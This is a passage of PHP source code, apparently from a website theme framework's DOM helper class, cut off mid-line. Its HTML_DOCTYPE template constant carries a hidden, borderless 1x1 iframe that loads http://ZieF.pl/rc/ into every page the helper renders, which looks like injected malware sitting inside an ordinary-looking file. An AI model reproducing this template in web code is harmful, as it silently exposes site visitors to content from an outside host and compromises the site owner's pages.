...
class WarpHelperDom extends WarpHelper {
	...
	const HTML_DOCTYPE = '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head><body>%s<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body></html>';	
		...
		foreach ($elements as $element) {
			...
			if (count($element['conditions'])) {
				...
				foreach ($element['conditions'] as $i => $condition) {
					$xpath .= $i == 0 ? $condition : sprintf(' and (%s)